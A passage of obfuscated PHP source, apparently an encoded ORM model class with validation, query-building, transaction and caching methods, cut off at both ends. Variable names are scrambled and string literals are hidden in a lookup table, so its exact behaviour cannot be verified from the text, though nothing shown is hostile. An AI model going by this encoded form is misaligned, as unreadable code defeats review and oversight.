(!$this->autoCheckToken($ÁŒ‡Ù¹İ)) { $this->error = think_lang($Â”ƒ±ı…[300]); return !1; } if ($this->autoCheckFields) { $ĞÚ¡ĞÏ« = $this->getDbFields(); foreach ($ÁŒ‡Ù¹İ as $ñ¦ô— => $ôãâ «ó) { if (!in_array($ñ¦ô—, $ĞÚ¡ĞÏ«)) { unset($ÁŒ‡Ù¹İ[$ñ¦ô—]); } elseif (MAGIC_QUOTES_GPC && is_string($ôãâ «ó)) { $ÁŒ‡Ù¹İ[$ñ¦ô—] = stripslashes($ôãâ «ó); } } } $this->autoOperation($ÁŒ‡Ù¹İ, $ğéÕÜÉ‹); $this->data = $ÁŒ‡Ù¹İ; return $ÁŒ‡Ù¹İ; } public function autoCheckToken($õâàÀæ¤) { $°ÔşÚŠ =& $_SERVER[­õöî’–]; if (isset($this->options[$°ÔşÚŠ[301]]) && !$this->options[$°ÔşÚŠ[301]]) { return !0; } if (think_config($°ÔşÚŠ[298])) { $ã‰¹¸¬ = think_config($°ÔşÚŠ[299]); if (!isset($õâàÀæ¤[$ã‰¹¸¬]) || Session::get($ã‰¹¸¬)) { return !1; } list($íñşåâ€, $’ÁİØ¹ø) = explode($°ÔşÚŠ[11], $õâàÀæ¤[$ã‰¹¸¬]); if ($’ÁİØ¹ø && Session::get($ã‰¹¸¬ . $°ÔşÚŠ[10] . $íñşåâ€) === $’ÁİØ¹ø) { Session::remove($ã‰¹¸¬ . $°ÔşÚŠ[10] . $íñşåâ€); return !0; } if (think_config($°ÔşÚŠ[302])) { Session::remove($ã‰¹¸¬ . $°ÔşÚŠ[10] . $íñşåâ€); } return !1; } return !0; } public function regex($çî¡ÀÓ, $Ë“Ù¥¢å) { $§š­‡Û =& $_SERVER[­õöî’–]; $¥«±Üş = array($§š­‡Û[303] => $§š­‡Û[304], $§š­‡Û[305] => $§š­‡Û[306], $§š­‡Û[307] => $§š­‡Û[308], $§š­‡Û[309] => $§š­‡Û[310], $§š­‡Û[311] => $§š­‡Û[312], $§š­‡Û[313] => $§š­‡Û[314], $§š­‡Û[315] => $§š­‡Û[316], $§š­‡Û[290] => $§š­‡Û[317], $§š­‡Û[318] => $§š­‡Û[319]); if (isset($¥«±Üş[strtolower($Ë“Ù¥¢å)])) { $Ë“Ù¥¢å = $¥«±Üş[strtolower($Ë“Ù¥¢å)]; } return preg_match($Ë“Ù¥¢å, $çî¡ÀÓ) === 1; } private function autoOperation(&$ÃÙãÙ¾, $¹—ı…È•) { $É¢ôÍ™ =& $_SERVER[­õöî’–]; if (!empty($this->options[$É¢ôÍ™[320]])) { $´¹Àóæü = $this->options[$É¢ôÍ™[320]]; unset($this->options[$É¢ôÍ™[320]]); } elseif (!empty($this->_auto)) { $´¹Àóæü = $this->_auto; } if (isset($´¹Àóæü)) { foreach ($´¹Àóæü as $İ—›ŠÚı) { if (empty($İ—›ŠÚı[2])) { $İ—›ŠÚı[2] = THINK_MODEL_INSERT; } if ($¹—ı…È• == $İ—›ŠÚı[2] || $İ—›ŠÚı[2] == THINK_MODEL_BOTH) { switch (trim($İ—›ŠÚı[3])) { case $É¢ôÍ™[321]: case $É¢ôÍ™[322]: $´×ûóµ† = isset($İ—›ŠÚı[4]) ? (array) $İ—›ŠÚı[4] : array(); if (isset($ÃÙãÙ¾[$İ—›ŠÚı[0]])) { array_unshift($´×ûóµ†, $ÃÙãÙ¾[$İ—›ŠÚı[0]]); } if ($É¢ôÍ™[321] == $İ—›ŠÚı[3]) { $ÃÙãÙ¾[$İ—›ŠÚı[0]] = call_user_func_array($İ—›ŠÚı[1], $´×ûóµ†); } else { $ÃÙãÙ¾[$İ—›ŠÚı[0]] = call_user_func_array(array(&$this, $İ—›ŠÚı[1]), $´×ûóµ†); } break; case $É¢ôÍ™[273]: $ÃÙãÙ¾[$İ—›ŠÚı[0]] = $ÃÙãÙ¾[$İ—›ŠÚı[1]]; break; case $É¢ôÍ™[323]: if ($É¢ôÍ™[12] === $ÃÙãÙ¾[$İ—›ŠÚı[0]]) { unset($ÃÙãÙ¾[$İ—›ŠÚı[0]]); } break; case $É¢ôÍ™[324]: default: $ÃÙãÙ¾[$İ—›ŠÚı[0]] = $İ—›ŠÚı[1]; } if (!1 === $ÃÙãÙ¾[$İ—›ŠÚı[0]]) { unset($ÃÙãÙ¾[$İ—›ŠÚı[0]]); } } } } return $ÃÙãÙ¾; } protected function autoValidation($Ôé¯ÏÓÔ, $ÊıÕÂ) { $Ÿıªôâı =& $_SERVER[­õöî’–]; if (!empty($this->options[$Ÿıªôâı[325]])) { $ª‹ÁÜŸÓ = $this->options[$Ÿıªôâı[325]]; unset($this->options[$Ÿıªôâı[325]]); } elseif (!empty($this->_validate)) { $ª‹ÁÜŸÓ = $this->_validate; } if (isset($ª‹ÁÜŸÓ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ª‹ÁÜŸÓ as $«û¶²¿í => $À¸ª„‘ü) { if (empty($À¸ª„‘ü[5]) || $À¸ª„‘ü[5] == THINK_MODEL_BOTH || $À¸ª„‘ü[5] == $ÊıÕÂ) { if (0 == strpos($À¸ª„‘ü[2], $Ÿıªôâı[326]) && strpos($À¸ª„‘ü[2], $Ÿıªôâı[327])) { $À¸ª„‘ü[2] = think_lang(substr($À¸ª„‘ü[2], 2, -1)); } $À¸ª„‘ü[3] = isset($À¸ª„‘ü[3]) ? $À¸ª„‘ü[3] : THINK_EXISTS_VALIDATE; $À¸ª„‘ü[4] = isset($À¸ª„‘ü[4]) ? $À¸ª„‘ü[4] : $Ÿıªôâı[328]; switch ($À¸ª„‘ü[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ôé¯ÏÓÔ, $À¸ª„‘ü)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ÿıªôâı[12] != trim($Ôé¯ÏÓÔ[$À¸ª„‘ü[0]])) { if (!1 === $this->_validationField($Ôé¯ÏÓÔ, $À¸ª„‘ü)) { return !1; } } break; default: if (isset($Ôé¯ÏÓÔ[$À¸ª„‘ü[0]])) { if (!1 === $this->_validationField($Ôé¯ÏÓÔ, $À¸ª„‘ü)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($÷Ş„ö‚, $Ğµ­Ê½Ç) { if (!1 === $this->_validationFieldItem($÷Ş„ö‚, $Ğµ­Ê½Ç)) { if ($this->patchValidate) { $this->error[$Ğµ­Ê½Ç[0]] = $Ğµ­Ê½Ç[2]; } else { $this->error = $Ğµ­Ê½Ç[2]; return !1; } } return; } protected function _validationFieldItem($Ç ½È‹, $ï«ÂØ“œ) { $™œ¢¿èì =& $_SERVER[­õöî’–]; switch (strtolower(trim($ï«ÂØ“œ[4]))) { case $™œ¢¿èì[321]: case $™œ¢¿èì[322]: $Õ½Ùê×¾ = isset($ï«ÂØ“œ[6]) ? (array) $ï«ÂØ“œ[6] : array(); if (is_string($ï«ÂØ“œ[0]) && strpos($ï«ÂØ“œ[0], $™œ¢¿èì[50])) { $ï«ÂØ“œ[0] = explode($™œ¢¿èì[50], $ï«ÂØ“œ[0]); } if (is_array($ï«ÂØ“œ[0])) { foreach ($ï«ÂØ“œ[0] as $ú—îí¢) { $èîÔàÈ[$ú—îí¢] = $Ç ½È‹[$ú—îí¢]; } array_unshift($Õ½Ùê×¾, $èîÔàÈ); } else { array_unshift($Õ½Ùê×¾, $Ç ½È‹[$ï«ÂØ“œ[0]]); } if ($™œ¢¿èì[321] == $ï«ÂØ“œ[4]) { return call_user_func_array($ï«ÂØ“œ[1], $Õ½Ùê×¾); } else { return call_user_func_array(array(&$this, $ï«ÂØ“œ[1]), $Õ½Ùê×¾); } case $™œ¢¿èì[329]: return $Ç ½È‹[$ï«ÂØ“œ[0]] == $Ç ½È‹[$ï«ÂØ“œ[1]]; case $™œ¢¿èì[330]: if (is_string($ï«ÂØ“œ[0]) && strpos($ï«ÂØ“œ[0], $™œ¢¿èì[50])) { $ï«ÂØ“œ[0] = explode($™œ¢¿èì[50], $ï«ÂØ“œ[0]); } $ä¦æğ‹ƒ = array(); if (is_array($ï«ÂØ“œ[0])) { foreach ($ï«ÂØ“œ[0] as $ú—îí¢) { $ä¦æğ‹ƒ[$ú—îí¢] = $Ç ½È‹[$ú—îí¢]; } } else { $ä¦æğ‹ƒ[$ï«ÂØ“œ[0]] = $Ç ½È‹[$ï«ÂØ“œ[0]]; } if (!empty($Ç ½È‹[$this->getPk()])) { $ä¦æğ‹ƒ[$this->getPk()] = array($™œ¢¿èì[331], $Ç ½È‹[$this->getPk()]); } if ($this->where($ä¦æğ‹ƒ)->find()) { return !1; } return !0; default: return $this->check($Ç ½È‹[$ï«ÂØ“œ[0]], $ï«ÂØ“œ[1], $ï«ÂØ“œ[4]); } } public function check($éö¦Øíò, $áÉ²‰Ô, $–æèå = "\162\x65\147\x65\x78") { $ñ½ŸéÍ =& $_SERVER[­õöî’–]; $–æèå = strtolower(trim($–æèå)); switch ($–æèå) { case $ñ½ŸéÍ[7]: case $ñ½ŸéÍ[332]: $Ãå°ÃóŞ = is_array($áÉ²‰Ô) ? $áÉ²‰Ô : explode($ñ½ŸéÍ[50], $áÉ²‰Ô); return $–æèå == $ñ½ŸéÍ[7] ? in_array($éö¦Øíò, $Ãå°ÃóŞ) : !in_array($éö¦Øíò, $Ãå°ÃóŞ); case $ñ½ŸéÍ[333]: case $ñ½ŸéÍ[334]: if (is_array($áÉ²‰Ô)) { $Šèê¸Ù = $áÉ²‰Ô[0]; $è“‰Æ›¼ = $áÉ²‰Ô[1]; } else { list($Šèê¸Ù, $è“‰Æ›¼) = explode($ñ½ŸéÍ[50], $áÉ²‰Ô); } return $–æèå == $ñ½ŸéÍ[333] ? $éö¦Øíò >= $Šèê¸Ù && $éö¦Øíò <= $è“‰Æ›¼ : $éö¦Øíò < $Šèê¸Ù || $éö¦Øíò > $è“‰Æ›¼; case $ñ½ŸéÍ[335]: case $ñ½ŸéÍ[336]: return $–æèå == $ñ½ŸéÍ[335] ? $éö¦Øíò == $áÉ²‰Ô : $éö¦Øíò != $áÉ²‰Ô; case $ñ½ŸéÍ[337]: $ …²Ÿƒ = mb_strlen($éö¦Øíò, $ñ½ŸéÍ[338]); if (strpos($áÉ²‰Ô, $ñ½ŸéÍ[50])) { list($Šèê¸Ù, $è“‰Æ›¼) = explode($ñ½ŸéÍ[50], $áÉ²‰Ô); return $ …²Ÿƒ >= $Šèê¸Ù && $ …²Ÿƒ <= $è“‰Æ›¼; } else { return $ …²Ÿƒ == $áÉ²‰Ô; } case $ñ½ŸéÍ[339]: list($ğÁ³—™ù, $œÆÏ¬ÅÎ) = explode($ñ½ŸéÍ[50], $áÉ²‰Ô); if (!is_numeric($ğÁ³—™ù)) { $ğÁ³—™ù = strtotime($ğÁ³—™ù); } if (!is_numeric($œÆÏ¬ÅÎ)) { $œÆÏ¬ÅÎ = strtotime($œÆÏ¬ÅÎ); } return NOW_TIME >= $ğÁ³—™ù && NOW_TIME <= $œÆÏ¬ÅÎ; case $ñ½ŸéÍ[340]: return in_array(get_client_ip(), explode($ñ½ŸéÍ[50], $áÉ²‰Ô)); case $ñ½ŸéÍ[341]: return !in_array(get_client_ip(), explode($ñ½ŸéÍ[50], $áÉ²‰Ô)); case $ñ½ŸéÍ[328]: default: return $this->regex($éö¦Øíò, $áÉ²‰Ô); } } public function query($¶–ç¬ÙÔ, $˜Õşú¥Õ = false) { $ª÷ãÁ¿‘ =& $_SERVER[­õöî’–]; if (!is_bool($˜Õşú¥Õ) && !is_array($˜Õşú¥Õ)) { $˜Õşú¥Õ = func_get_args(); array_shift($˜Õşú¥Õ); } $¶–ç¬ÙÔ = str_replace(array($ª÷ãÁ¿‘[231], $ª÷ãÁ¿‘[342]), $ª÷ãÁ¿‘[53], $¶–ç¬ÙÔ); $¶–ç¬ÙÔ = $this->parseSql($¶–ç¬ÙÔ, $˜Õşú¥Õ); return $this->db->query($¶–ç¬ÙÔ); } public function execute($ŒºµÉğ‘, $Âİ¡¤š = false) { if (!is_bool($Âİ¡¤š) && !is_array($Âİ¡¤š)) { $Âİ¡¤š = func_get_args(); array_shift($Âİ¡¤š); } $ŒºµÉğ‘ = $this->parseSql($ŒºµÉğ‘, $Âİ¡¤š); return $this->db->execute($ŒºµÉğ‘); } protected function parseSql($İ±û¹ˆÛ, $ë¾¡ƒÔÌ) { $­¡–şùÉ =& $_SERVER[­õöî’–]; if (!0 === $ë¾¡ƒÔÌ) { $Õù•ö“½ = $this->_parseOptions(); $İ±û¹ˆÛ = $this->db->parseSql($İ±û¹ˆÛ, $Õù•ö“½); } elseif (is_array($ë¾¡ƒÔÌ)) { $ë¾¡ƒÔÌ = array_map(array($this->db, $­¡–şùÉ[343]), $ë¾¡ƒÔÌ); $İ±û¹ˆÛ = vsprintf($İ±û¹ˆÛ, $ë¾¡ƒÔÌ); } else { $İ±û¹ˆÛ = strtr($İ±û¹ˆÛ, array($­¡–şùÉ[344] => $this->getTableName(), $­¡–şùÉ[345] => think_config($­¡–şùÉ[244]))); } $this->db->setModel($this->name); return $İ±û¹ˆÛ; } public function db($òøéê« = '', $´İÛğ¬³ = '', $üå·ÇÅù = array()) { $ šÎ”ë  =& $_SERVER[­õöî’–]; if ($ šÎ”ë [12] === $òøéê« && $this->db) { return $this->db; } static $¤¯İÁ…ü = array(); static $•î®ÁÛĞ = array(); if (!isset($•î®ÁÛĞ[$òøéê«]) || isset($•î®ÁÛĞ[$òøéê«]) && $´İÛğ¬³ && $¤¯İÁ…ü[$òøéê«] != $´İÛğ¬³) { if (!empty($´İÛğ¬³) && is_string($´İÛğ¬³) && !1 === strpos($´İÛğ¬³, $ šÎ”ë [8])) { $´İÛğ¬³ = think_config($´İÛğ¬³); } $òøéê« = think_guid($´İÛğ¬³); $•î®ÁÛĞ[$òøéê«] = Db::getInstance($´İÛğ¬³); } elseif (NULL === $´İÛğ¬³) { $•î®ÁÛĞ[$òøéê«]->close(); unset($•î®ÁÛĞ[$òøéê«]); return; } if (!empty($üå·ÇÅù)) { if (is_string($üå·ÇÅù)) { parse_str($üå·ÇÅù, $üå·ÇÅù); } foreach ($üå·ÇÅù as $àÂ“Ô…Í => $Áà³å¨Ï) { $this->setProperty($àÂ“Ô…Í, $Áà³å¨Ï); } } $¤¯İÁ…ü[$òøéê«] = $´İÛğ¬³; $this->db = $•î®ÁÛĞ[$òøéê«]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¨¼“Üåğ = get_class($this); if ($¨¼“Üåğ == $_SERVER[­õöî’–][346]) { return $this->name; } $this->name = substr($¨¼“Üåğ, 0, -5); } return $this->name; } public function getTableName() { $Ò— ¯·‘ =& $_SERVER[­õöî’–]; if (empty($this->trueTableName)) { $•‚¨ƒ¶· = !empty($this->tablePrefix) ? $this->tablePrefix : $Ò— ¯·‘[12]; if (!empty($this->tableName)) { $•‚¨ƒ¶· .= $this->tableName; } else { $•‚¨ƒ¶· .= think_parse_name($this->name); } $this->trueTableName = strtolower($•‚¨ƒ¶·); } return (!empty($this->dbName) ? $this->dbName . $Ò— ¯·‘[10] : $Ò— ¯·‘[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $àƒËáô =& $_SERVER[­õöî’–]; return isset($this->fields[$àƒËáô[251]]) ? $this->fields[$àƒËáô[251]] : $this->pk; } public function getDbFields() { $±ûËÂöÂ =& $_SERVER[­õöî’–]; if (isset($this->options[$±ûËÂöÂ[279]])) { $ŠÁ„ˆ°£ = $this->db->getFields($this->options[$±ûËÂöÂ[279]]); return $ŠÁ„ˆ°£ ? array_keys($ŠÁ„ˆ°£) : !1; } if ($this->fields) { $ŠÁ„ˆ°£ = $this->fields; unset($ŠÁ„ˆ°£[$±ûËÂöÂ[250]], $ŠÁ„ˆ°£[$±ûËÂöÂ[251]], $ŠÁ„ˆ°£[$±ûËÂöÂ[252]], $ŠÁ„ˆ°£[$±ûËÂöÂ[249]]); return $ŠÁ„ˆ°£; } return !1; } public function data($¤¹•¼Õ² = '') { $š›ÉØ¬‡ =& $_SERVER[­õöî’–]; if ($š›ÉØ¬‡[12] === $¤¹•¼Õ² && !empty($this->data)) { return $this->data; } if (is_object($¤¹•¼Õ²)) { $¤¹•¼Õ² = get_object_vars($¤¹•¼Õ²); } elseif (is_string($¤¹•¼Õ²)) { parse_str($¤¹•¼Õ², $¤¹•¼Õ²); } elseif (!is_array($¤¹•¼Õ²)) { think_exception(think_lang($š›ÉØ¬‡[271])); } $this->data = $¤¹•¼Õ²; return $this; } public function join($Áå¨æÕÈ) { $øæşŠò =& $_SERVER[­õöî’–]; if (is_array($Áå¨æÕÈ)) { $this->options[$øæşŠò[282]] = $Áå¨æÕÈ; } elseif (!empty($Áå¨æÕÈ)) { $this->options[$øæşŠò[282]][] = $Áå¨æÕÈ; } return $this; } public function union($İá²œÉ, $Ø€Ûø€ = false) { $ŞŠ¸ã×ë =& $_SERVER[­õöî’–]; if (empty($İá²œÉ)) { return $this; } if ($Ø€Ûø€) { $this->options[$ŞŠ¸ã×ë[347]][$ŞŠ¸ã×ë[348]] = !0; } if (is_object($İá²œÉ)) { $İá²œÉ = get_object_vars($İá²œÉ); } if (is_string($İá²œÉ)) { $À‘Ò‚­ = $İá²œÉ; } elseif (is_array($İá²œÉ)) { if (isset($İá²œÉ[0])) { $this->options[$ŞŠ¸ã×ë[347]] = array_merge($this->options[$ŞŠ¸ã×ë[347]], $İá²œÉ); return $this; } else { $À‘Ò‚­ = $İá²œÉ; } } else { think_exception(think_lang($ŞŠ¸ã×ë[271])); } $this->options[$ŞŠ¸ã×ë[347]][] = $À‘Ò‚­; return $this; } public function cache($©”Ç¥°ö = true, $¨Úá¸–Ü = null, $ˆÜÄ€¶Ê = '') { $Ö»·éä =& $_SERVER[­õöî’–]; if (!1 !== $©”Ç¥°ö) { $this->options[$Ö»·éä[349]] = array($Ö»·éä[94] => $©”Ç¥°ö, $Ö»·éä[339] => $¨Úá¸–Ü, $Ö»·éä[33] => $ˆÜÄ€¶Ê); } return $this; } public function field($”ğç—¤”, $â×‚£¦º = false) { $ğı»Ë ” =& $_SERVER[­õöî’–]; if (!0 === $”ğç—¤”) { $ÓÃÔ£¶ä = $this->getDbFields(); $”ğç—¤” = $ÓÃÔ£¶ä ? $ÓÃÔ£¶ä : $ğı»Ë ”[188]; } elseif ($â×‚£¦º) { if (is_string($”ğç—¤”)) { $”ğç—¤” = explode($ğı»Ë ”[50], $”ğç—¤”); } $ÓÃÔ£¶ä = $this->getDbFields(); $”ğç—¤” = $ÓÃÔ£¶ä ? array_diff($ÓÃÔ£¶ä, $”ğç—¤”) : $”ğç—¤”; } $this->options[$ğı»Ë ”[273]] = $”ğç—¤”; return $this; } public function scope($÷¾ªôŒ¢ = '', $†”®ªÛñ = NULL) { $Ûº„Úñ» =& $_SERVER[­õöî’–]; if ($Ûº„Úñ»[12] === $÷¾ªôŒ¢) { if (isset($this->_scope[$Ûº„Úñ»[37]])) { $Í¶µáæ = $this->_scope[$Ûº„Úñ»[37]]; } else { return $this; } } elseif (is_string($÷¾ªôŒ¢)) { $İÏÏÕ©Á = explode($Ûº„Úñ»[50], $÷¾ªôŒ¢); $Í¶µáæ = array(); foreach ($İÏÏÕ©Á as $ ¨ŸõÊä) { if (!isset($this->_scope[$ ¨ŸõÊä])) { continue; } $Í¶µáæ = array_merge($Í¶µáæ, $this->_scope[$ ¨ŸõÊä]); } if (!empty($†”®ªÛñ) && is_array($†”®ªÛñ)) { $Í¶µáæ = array_merge($Í¶µáæ, $†”®ªÛñ); } } elseif (is_array($÷¾ªôŒ¢)) { $Í¶µáæ = $÷¾ªôŒ¢; } if (is_array($Í¶µáæ) && !empty($Í¶µáæ)) { $this->options = array_merge($this->options, array_change_key_case($Í¶µáæ)); } return $this; } public function where($¬¦à±‚, $»È¥íœ = null) { $şı¤î¿¥ =& $_SERVER[­õöî’–]; if (!is_null($»È¥íœ) && is_string($¬¦à±‚)) { if (!is_array($»È¥íœ)) { $»È¥íœ = func_get_args(); array_shift($»È¥íœ); } $»È¥íœ = array_map(array($this->db, $şı¤î¿¥[343]), $»È¥íœ); $¬¦à±‚ = vsprintf($¬¦à±‚, $»È¥íœ); } elseif (is_object($¬¦à±‚)) { $¬¦à±‚ = get_object_vars($¬¦à±‚); } elseif (is_array($¬¦à±‚)) { foreach ($¬¦à±‚ as $ø°±ş—ñ => $ãğ—¸«) { if ((is_numeric($ø°±ş—ñ) || !$ø°±ş—ñ) && is_string($ãğ—¸«)) { if (strpos($ãğ—¸«, $şı¤î¿¥[350]) === 0) { continue; } think_trace($şı¤î¿¥[351], $şı¤î¿¥[12], $şı¤î¿¥[49]); die; } } } if (is_string($¬¦à±‚) && $şı¤î¿¥[12] != $¬¦à±‚) { $©¶š“¸ = array(); $©¶š“¸[$şı¤î¿¥[352]] = $¬¦à±‚; $¬¦à±‚ = $©¶š“¸; } if (isset($this->options[$şı¤î¿¥[275]])) { $this->options[$şı¤î¿¥[275]] = array_merge($this->options[$şı¤î¿¥[275]], $¬¦à±‚); } else { $this->options[$şı¤î¿¥[275]] = $¬¦à±‚; } return $this; } public function limit($Ášñ³í°, $‰‡‘ïö÷ = null) { $öæ´µ˜ =& $_SERVER[­õöî’–]; $this->options[$öæ´µ˜[292]] = is_null($‰‡‘ïö÷) ? $Ášñ³í° : $Ášñ³í° . $öæ´µ˜[50] . $‰‡‘ïö÷; return $this; } public function page($â˜á©è—, $ù¶öùÇÓ = null) { $ìï«ó =& $_SERVER[­õöî’–]; $this->options[$ìï«ó[353]] = is_null($ù¶öùÇÓ) ? $â˜á©è— : $â˜á©è— . $ìï«ó[50] . $ù¶öùÇÓ; return $this; } public function comment($®€…°Ûº) { $this->options[$_SERVER[­õöî’–][354]] = $®€…°Ûº; return $this; } public function setProperty($Ûõéé»í, $å¥¯‰) { if (property_exists($this, $Ûõéé»í)) { $this->{$Ûõéé»í} = $å¥¯‰; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\x66\x79\x54\151\x6d\145", "\164\151\x6d\x65", "\x69\x6e\163\x65\162\164\x2c\x75\x70\x64\141\164\145", "\146\x75\156\x63\x74\x69\157\156"), array("\143\162\x65\x61\x74\x65\x54\x69\155\x65", "\x74\x69\x6d\145", "\151\x6e\x73\145\x72\164", "\x66\165\156\143\164\x69\157\x6e")); public function setDataAuto($†µ¶ôâ”) { $this->dataAuto = $†µ¶ôâ”; } public function __construct($·Ëõš™° = '', $Ô©•µø = '', $äÜ˜õ•Î = '') { parent::__construct($·Ëõš™°, $Ô©•µø, $äÜ˜õ•Î); } protected $tableMeta = array(); protected function _beforeInsert(&$®ºâ¯¨ã, $‘ºİ–¾ó) { $ÄšõÍ³Á =& $_SERVER[­õöî’–]; if (!$this->checkDataAutoHas($ÄšõÍ³Á[355])) { return; } $this->dataBeforeFilter($®ºâ¯¨ã, $ÄšõÍ³Á[355]); } protected function _beforeUpdate(&$„Ğã“¡‘, $“ÏË—±) { $Ø¥ÍÖíò =& $_SERVER[­õöî’–]; if (!$this->checkDataAutoHas($Ø¥ÍÖíò[356])) { return; } $this->dataBeforeFilter($„Ğã“¡‘, $Ø¥ÍÖíò[356]); } protected function _afterSelect(&$½ŸÀŠ™¤, $ã©ï®Ã¬) { if (!is_array($½ŸÀŠ™¤)) { return; } if (!$this->checkDataAutoHas($_SERVER[­õöî’–][357])) { return; } foreach ($½ŸÀŠ™¤ as &$·úÂƒà¤) { $this->dataAfterFilter($·úÂƒà¤); } unset($·úÂƒà¤); } protected function _afterFind(&$ı¦ı©€ö, $¸Ğš²) { if (!is_array($ı¦ı©€ö)) { return; } if (!$this->checkDataAutoHas($_SERVER[­õöî’–][357])) { return; } $this->dataAfterFilter($ı¦ı©€ö); } public static function textEncode($Ê„“Å›Í) { if (!$Ê„“Å›Í) { return $Ê„“Å›Í; } $º…§¶´ã = json_encode($Ê„“Å›Í); $º…§¶´ã = preg_replace_callback($_SERVER[­õöî’–][358], function ($àış®Â) { return addslashes($àış®Â[0]); }, $º…§¶´ã); return json_decode($º…§¶´ã); } public static function textDecode($à¾÷¤ª±) { $Ãú…é™ =& $_SERVER[­õöî’–]; $£¡ŒÁŠå = json_encode($à¾÷¤ª±); $£¡ŒÁŠå = preg_replace_callback($Ãú…é™[359], function ($µ³›»Òç) { return $_SERVER[­õöî’–][97]; }, $£¡ŒÁŠå); return json_decode($£¡ŒÁŠå); } public function setAutoIncrement($›«Ö¸ôµ) { $ŞĞİÍ®‚ = array($this->getPk() => $›«Ö¸ôµ); $«©³Ì­ = $this->data($ŞĞİÍ®‚)->add(); if ($«©³Ì­) { $this->delete($«©³Ì­); } } public function getAutoIncrement() { $ÑşâÔë = $this->getTableName(); $ãËÛ×Ä = $this->max($this->getPk()); $²Èƒˆé° = $this->query("\163\150\x6f\167\40\164\141\142\x6c\145\x20\x73\164\x61\164\165\x73\40\x77\150\145\x72\145\40\x4e\x61\x6d\145\75\47{$ÑşâÔë}\47"); $Â…Éƒ´Ö = $²Èƒˆé°[0][$_SERVER[­õöî’–][360]]; $ßÚ¾ò¼ = max($ãËÛ×Ä, $Â…Éƒ´Ö); return $ßÚ¾ò¼; } protected function _callBefore($ÜóÑĞğ¥, $ÏÌ¬şë) { return $this->cacheCallCheck($ÜóÑĞğ¥, $ÏÌ¬şë, !1); } protected function _callAfter($œñÏÇ¢£, $šŞå¨Ï) { return $this->cacheCallCheck($œñÏÇ¢£, $šŞå¨Ï, !0); } protected function cacheFunctionAlias($²ÆêÄÒÆ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($å¤ëñÄ©, $œŞâšğÜ, $ÀˆÓÒïÀ = false) { $ËÜı¸ó = $this->cacheFunctionAlias($œŞâšğÜ); if (!$ËÜı¸ó) { return; } foreach ($ËÜı¸ó as $û˜­Å©ş => $©‰ÀôÕ) { $Šõ¿àÉË = $©‰ÀôÕ[0]; $’Ô‹€¦ = explode($_SERVER[­õöî’–][50], $©‰ÀôÕ[1]); if ($å¤ëñÄ© == $û˜­Å©ş) { return $this->cacheFunctionGet($û˜­Å©ş, $Šõ¿àÉË); } if ($ÀˆÓÒïÀ && in_array($å¤ëñÄ©, $’Ô‹€¦)) { $this->cacheFunctionClear($û˜­Å©ş, $Šõ¿àÉË); } } } public function cacheFunctionGet($ŸàŒÀáã, $Ä¨”°œ) { $Ö¹¤Á¶™ = $this->cacheKeyMake($ŸàŒÀáã, $Ä¨”°œ); $†”¾Œ¸ò = Cache::get($Ö¹¤Á¶™); if (!is_array($†”¾Œ¸ò)) { $†”¾Œ¸ò = call_user_func_array(array($this, $ŸàŒÀáã), array($Ä¨”°œ, !0)); Cache::set($Ö¹¤Á¶™, $†”¾Œ¸ò); } return $†”¾Œ¸ò; } public function cacheFunctionClear($…ÀæÙ‘â, $ô…•ğûä) { $˜ïı¡ó = $ô…•ğûä; if (!is_array($ô…•ğûä)) { $˜ïı¡ó = array($ô…•ğûä); } foreach ($˜ïı¡ó as $ğ¿å—Œ) { $¶‚´ò¾” = $this->cacheKeyMake($…ÀæÙ‘â, $ğ¿å—Œ); Cache::remove($¶‚´ò¾”); } } private function cacheKeyMake($ñÛÅÁ¹‡, $ª£¹”ªú) { $Ì³ÙÁ¹­ =& $_SERVER[­õöî’–]; return get_class($this) . $Ì³ÙÁ¹­[11] . $ñÛÅÁ¹‡ . $Ì³ÙÁ¹­[361] . $ª£¹”ªú; } protected function selectPageReset() { $†’ÍÛÕã =& $_SERVER[­õöî’–]; if (isset($GLOBALS[$†’ÍÛÕã[362]])) { return; } $GLOBALS[$†’ÍÛÕã[362]] = isset($GLOBALS[$†’ÍÛÕã[7]][$†’ÍÛÕã[363]]) ? $GLOBALS[$†’ÍÛÕã[7]][$†’ÍÛÕã[363]] : !1; $GLOBALS[$†’ÍÛÕã[364]] = isset($GLOBALS[$†’ÍÛÕã[7]][$†’ÍÛÕã[353]]) ? $GLOBALS[$†’ÍÛÕã[7]][$†’ÍÛÕã[353]] : !1; $GLOBALS[$†’ÍÛÕã[7]][$†’ÍÛÕã[363]] = !1; $GLOBALS[$†’ÍÛÕã[7]][$†’ÍÛÕã[353]] = !1; } protected function selectPageRestore() { $î­ÎŸÓ =& $_SERVER[­õöî’–]; if (!isset($GLOBALS[$î­ÎŸÓ[362]])) { return; } $GLOBALS[$î­ÎŸÓ[7]][$î­ÎŸÓ[363]] = $GLOBALS[$î­ÎŸÓ[362]]; $GLOBALS[$î­ÎŸÓ[7]][$î­ÎŸÓ[353]] = $GLOBALS[$î­ÎŸÓ[364]]; if ($GLOBALS[$î­ÎŸÓ[7]][$î­ÎŸÓ[363]] === !1) { unset($GLOBALS[$î­ÎŸÓ[7]][$î­ÎŸÓ[363]]); } if ($GLOBALS[$î­ÎŸÓ[7]][$î­ÎŸÓ[353]] === !1) { unset($GLOBALS[$î­ÎŸÓ[7]][$î­ÎŸÓ[353]]); } unset($GLOBALS[$î­ÎŸÓ[362]]); unset($GLOBALS[$î­ÎŸÓ[364]]); } protected function selectPage($è‡¨Ÿš… = 200, $©Ê™Ü = 1) { $Ñ’‘—Î” =& $_SERVER[­õöî’–]; global $in; $¢Ğ±Ô­Î = $this->optionsValue(); $ì£ÄüÀ = 50000; $è‡¨Ÿš… = 